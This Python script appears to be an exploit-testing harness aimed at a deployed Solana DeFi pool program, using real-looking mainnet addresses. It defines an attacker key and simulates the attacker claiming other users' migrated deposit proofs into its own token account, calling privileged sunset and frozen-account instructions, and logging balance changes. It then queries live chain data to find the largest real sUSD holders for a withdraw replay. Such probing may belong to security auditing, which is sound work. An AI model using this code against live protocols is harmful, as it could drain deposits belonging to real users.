#!/usr/bin/env python3
"""battery3: claimWithMigratedDepositProof + sunset_redeem_all + handleFrozenAccounts + live withdraw replay."""
import json, sys, os
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import solsim as S, solrpc as rpc, pda

PROG="s1aysqpEyZyijPybUV89oBGeooXrR22wMNLjnG2SWJA"
POOL="FhVcYNEe58SMtxpZGnTu2kpYJrTu2vwCZDGpPLqbd2yG"
USDC="EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v"
SUSD="susdabGDNbhrnCa6ncrYo81u4s9GM8ecK2UwMyZiq4X"
MANAGER="7671j7qpSf9X5KbQDraXReGK8Dxg5xGjr9n913BWhqru"
OPERATOR="AxnDY6nekRa4hEY1rm1g11A51EPPU29iAXXxh8vAqpM8"
FEERECIP="3NC1UF4pus6ditVzbcJCLFCVyBLVJm2kxKMhb3mPAoaz"
POOL_USDC_MAIN="DN2KzAeiHFnndVpjWSTw8UkwF9PZaFSthSnVoW1MVThQ"
POOL_SUSD_VAULT="FfELPrBpJBzyND1xTM6NmXRaQJbuP8c5J8jmJWZvDJds"
POOL_SUSD_RESERVE="93AZbo6a7De8YjSMbAL8xVasetsfwUjJnU5HMnzEaFXK"
OPENEDEN="9HhZLsdF8pGQ9fuSJH5UnqJyXBeuMJ729eYVesXCC6mc"
SUSDOFF="5P5xvu52ocJegFgdynRB2MtCJNbnw2jt6vbiAtFB8zQz"
SUNSET="EtKFLi9f8HnUpDbc9y8KeaA1dbYeYgUq34ruAJ9P2cZh"
RWA_VAULT="G9UFgtiWKkuJ2ekuYJJpYxdk8hbNjNkzPcN7p2xd4gkd"
POOL_RWA_MAIN="2pR6cGbrJz9EAdo2Qo9eiUkNa75QZRLGX4bhpdMXnFRM"
HOOK="48n7YGEww7fKMfJ5gJ3sQC3rM6RWGjpUsghqVfXVkR5A"
EXTRAMETAS="9sQhAH7vV3RKTCK13VY4EiNjs3qBq1srSYxdNufdAAXm"
PAUSE="98wFF5MpMjMQbfDF2MPzo8LCGX37unZR1ohRA1mU9GmJ"
CUSDO="BnANu5CtUogLqcvBNByJuwaRvRxNtVuDcAytwjsUUtqs"
ATA="ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL"
TOKEN="TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA"
TOKEN22="TokenzQdBNbLqP5VEhdkAS6EPFLC1PHnBqCXEpPxuEb"
SYS="11111111111111111111111111111111"
MIG1="3U2chkhnisqEoPT8WToTqRSSNKZuNJ45NJJxCNVc6ZHX"
MIG2="B1L4836Xvs4hyPyVgPiABqDLJcwEWZWNGcwNzmJHjiKe"
MIG1_USER_VAULT="8yC37CM48f6brABqbEnz9sh4DDydC1psF86r2zoWufzd"
MIG1_FROM="a7"  # placeholder

_D = json.load(open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "discriminators.json")))["instructions"]
D = {v: k for k, v in _D.items()}
def disc(n): return bytes.fromhex(D[n])
def W(k): return (k, True, False)
def R(k): return (k, False, False)
def SG(k): return (k, True, True)

ATTACKER = "743QjwzJdZwRibbPAc4ie73JeM7aWyCZtFT3ZVJXuVN8"
ATT_SUSD = pda.ata(ATTACKER, SUSD, TOKEN22)

def decode_mig(pk):
    raw = __import__("base64").b64decode(rpc.get_account_info(pk)["result"]["value"]["data"][0])
    import struct
    from solsim import b58enc
    o = 8
    bump = raw[o]; o+=1
    nonce = struct.unpack_from("<Q", raw, o)[0]; o+=8
    frm = b58enc(raw[o:o+32]); o+=32
    amount = struct.unpack_from("<Q", raw, o)[0]; o+=8
    mint = b58enc(raw[o:o+32]); o+=32
    batch = struct.unpack_from("<Q", raw, o)[0]; o+=8
    uv = b58enc(raw[o:o+32]); o+=32
    susd = struct.unpack_from("<Q", raw, o)[0]; o+=8
    return {"bump":bump,"nonce":nonce,"from":frm,"amount":amount,"mint":mint,"batchId":batch,"userSusdVault":uv,"susdAmount":susd}

m1 = decode_mig(MIG1); m2 = decode_mig(MIG2)
print("MIG1", json.dumps(m1)); print("MIG2", json.dumps(m2))

results=[]
def run(label, signer, ixs, ew=(), er=()):
    r = S.run(label, signer, ixs, ew, er)
    results.append(r)
    print("##", label, "=> err:", r.get("err"), "cu:", r.get("cu"))
    for l in (r.get("logs") or []):
        if "failed" in l or "Error" in l or "log:" in l:
            print("    ", l)
    pre = {b["accountIndex"]: int(b["uiTokenAmount"]["amount"]) for b in (r.get("pre") or [])}
    post = {b["accountIndex"]: int(b["uiTokenAmount"]["amount"]) for b in (r.get("post") or [])}
    for i in sorted(set(pre)|set(post)):
        if pre.get(i)!=post.get(i):
            print("     delta idx%d %s -> %s" % (i, pre.get(i), post.get(i)))
    print()
    return r

# --- claim variants ---
run("claim_MIG1_attacker_own_vault", ATTACKER, [(
    PROG, [SG(ATTACKER), W(FEERECIP), W(SUSD), W(POOL), W(POOL_SUSD_RESERVE), W(MIG1), W(ATT_SUSD), R(TOKEN22)],
    disc("claim_with_migrated_deposit_proof"))])
run("claim_MIG1_attacker_proof_vault", ATTACKER, [(
    PROG, [SG(ATTACKER), W(FEERECIP), W(SUSD), W(POOL), W(POOL_SUSD_RESERVE), W(MIG1), W(m1["userSusdVault"]), R(TOKEN22)],
    disc("claim_with_migrated_deposit_proof"))])
run("claim_MIG1_owner_signer", m1["from"], [(
    PROG, [SG(m1["from"]), W(FEERECIP), W(SUSD), W(POOL), W(POOL_SUSD_RESERVE), W(MIG1), W(m1["userSusdVault"]), R(TOKEN22)],
    disc("claim_with_migrated_deposit_proof"))])
run("claim_MIG2_attacker_own_vault", ATTACKER, [(
    PROG, [SG(ATTACKER), W(FEERECIP), W(SUSD), W(POOL), W(POOL_SUSD_RESERVE), W(MIG2), W(ATT_SUSD), R(TOKEN22)],
    disc("claim_with_migrated_deposit_proof"))])

# --- sunset_redeem_all: attacker vs manager ---
run("sunset_redeem_all_attacker_poolmut", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(SUSD), W(POOL), W(SUSDOFF), W(OPENEDEN), R(CUSDO),
           W(RWA_VAULT), W(POOL_RWA_MAIN), W(SUNSET), R(TOKEN22), R(SYS)],
    disc("sunset_redeem_all"))])
run("sunset_redeem_all_manager", MANAGER, [(
    PROG, [SG(MANAGER), R(USDC), W(SUSD), W(POOL), W(SUSDOFF), W(OPENEDEN), R(CUSDO),
           W(RWA_VAULT), W(POOL_RWA_MAIN), W(SUNSET), R(TOKEN22), R(SYS)],
    disc("sunset_redeem_all"))])

# --- handleFrozenAccounts with manager as signer (to learn) ---
run("handleFrozen_attacker_own", ATTACKER, [(
    PROG, [SG(ATTACKER), R(USDC), W(SUSD), W(ATT_SUSD), W(POOL), W(SUSDOFF), R(TOKEN22)],
    disc("handle_frozen_accounts"))])

# --- live withdraw replay: find a real sUSD holder ---
la = rpc.rpc("getTokenLargestAccounts", [SUSD, {"commitment":"confirmed"}])["result"]["value"]
print("sUSD largest:", json.dumps(la[:6]))
json.dump({"mig1":m1,"mig2":m2,"largest":la,"results":results},
          open(os.path.join(os.path.dirname(os.path.abspath(__file__)), "battery3.json"),"w"), indent=1)
